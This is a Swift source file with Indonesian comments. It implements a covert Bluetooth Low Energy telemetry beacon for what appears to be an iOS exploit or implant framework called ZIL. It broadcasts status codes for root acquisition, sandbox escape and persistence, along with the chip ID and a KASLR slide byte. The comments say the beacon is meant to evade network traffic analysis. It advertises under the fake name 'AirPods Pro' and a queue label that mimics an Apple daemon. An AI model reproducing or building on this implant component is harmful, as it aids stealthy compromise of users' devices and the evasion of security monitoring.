// ZIL v2.0 — Fitur 6: BLE Beacon Telemetry
// ============================================================
// Kirim status ZIL via Bluetooth Low Energy advertisement.
// Tidak melewati network traffic analyzer — invisible ke Proxy/MITM.
// Format: Apple-compatible iBeacon manufacturer data.
// ============================================================

import CoreBluetooth
import Foundation

/// Identifier daemon ZIL sebagai service BLE
private let ZIL_SERVICE_UUID = CBUUID(string: "5A494C42-0001-0001-0001-000000000001")

/// Status yang bisa dikodekan ke BLE beacon
@objc public enum ZilStatus: UInt8 {
    case idle        = 0x00  // ZIL belum aktif
    case scanning    = 0x01  // Memory scanning berjalan
    case rootAcquired = 0x02 // Root berhasil (cr_uid = 0)
    case sandboxFree  = 0x03 // Sandbox escape selesai
    case persistent   = 0x04 // Persistence berhasil
    case gpuActive    = 0x05 // GPU stealth path aktif
    case error        = 0xFF // Error, lihat error_code field
}

/// ZilBleBeacon — Broadcast status ZIL via BLE advertisement
///
/// FORMAT MANUFACTURER DATA (7 bytes total):
///   [0..1] 0x5A49          — ZIL magic bytes ("ZI")
///   [2]    status           — ZilStatus raw value
///   [3..4] chip_id (u16 LE) — Apple chip identifier
///   [5]    kaslr_hint       — Byte pertama KASLR slide (untuk diagnostik)
///   [6]    checksum         — XOR dari byte 0..5
///
/// Beacon ini tampak seperti custom manufacturer data biasa.
/// Tidak butuh pairing atau koneksi — pure advertisement.
@objc public class ZilBleBeacon: NSObject {

    // ── Internal State ──────────────────────────────────────────
    private var centralManager:     CBCentralManager?
    private var peripheralManager:  CBPeripheralManager?
    private var isAdvertising = false
    private var currentStatus: ZilStatus = .idle
    private var chipId:        UInt16 = 0
    private var kaslrHint:     UInt8  = 0

    // ── Singleton ───────────────────────────────────────────────
    @objc public static let shared = ZilBleBeacon()
    private override init() { super.init() }

    // ── Configuration ───────────────────────────────────────────

    /// Set chip identifier dari ZIL session
    @objc public func configure(chipId: UInt16, kaslrHint: UInt8) {
        self.chipId    = chipId
        self.kaslrHint = kaslrHint
    }

    // ── Beacon API ──────────────────────────────────────────────

    /// Mulai broadcast status via BLE.
    ///
    /// - Parameter status: ZilStatus yang akan di-broadcast
    @objc public func startBeacon(status: ZilStatus) {
        self.currentStatus = status

        guard peripheralManager == nil else {
            updateAdvertisementData()
            return
        }

        // Init peripheral manager di background queue
        let queue = DispatchQueue(label: "com.apple.silentd.ble", qos: .background)
        peripheralManager = CBPeripheralManager(delegate: self, queue: queue)
    }

    /// Stop BLE beacon dan bersihkan resource
    @objc public func stopBeacon() {
        peripheralManager?.stopAdvertising()
        peripheralManager = nil
        isAdvertising = false
    }

    /// Update status tanpa restart beacon
    @objc public func updateStatus(_ status: ZilStatus) {
        self.currentStatus = status
        if isAdvertising { updateAdvertisementData() }
    }

    // ── Internal ─────────────────────────────────────────────────

    private func buildManufacturerData() -> Data {
        var bytes = [UInt8](repeating: 0, count: 7)
        bytes[0] = 0x5A   // 'Z'
        bytes[1] = 0x49   // 'I'
        bytes[2] = currentStatus.rawValue
        bytes[3] = UInt8(chipId & 0xFF)
        bytes[4] = UInt8((chipId >> 8) & 0xFF)
        bytes[5] = kaslrHint
        bytes[6] = bytes[0] ^ bytes[1] ^ bytes[2] ^ bytes[3] ^ bytes[4] ^ bytes[5]
        return Data(bytes)
    }

    private func advertisementDict() -> [String: Any] {
        return [
            CBAdvertisementDataServiceUUIDsKey: [ZIL_SERVICE_UUID],
            CBAdvertisementDataManufacturerDataKey: buildManufacturerData(),
            // Gunakan nama yang tidak mencurigakan
            CBAdvertisementDataLocalNameKey: "AirPods Pro",
        ]
    }

    private func updateAdvertisementData() {
        guard let pm = peripheralManager, pm.state == .poweredOn else { return }
        pm.stopAdvertising()
        pm.startAdvertising(advertisementDict())
    }
}

// MARK: - CBPeripheralManagerDelegate
extension ZilBleBeacon: CBPeripheralManagerDelegate {

    public func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) {
        guard peripheral.state == .poweredOn else { return }
        peripheral.startAdvertising(advertisementDict())
        isAdvertising = true
    }

    public func peripheralManagerDidStartAdvertising(_ peripheral: CBPeripheralManager,
                                                      error: Error?) {
        if let e = error {
            // Error tapi non-fatal — ZIL tetap berjalan tanpa telemetri
            _ = e
            isAdvertising = false
        } else {
            isAdvertising = true
        }
    }
}

// MARK: - Integration Helper
/// Tambahkan ini ke ZilApi setelah root acquisition:
///
///   ZilBleBeacon.shared.configure(chipId: 0x18, kaslrHint: UInt8(kaslrSlide & 0xFF))
///   ZilBleBeacon.shared.startBeacon(status: .rootAcquired)
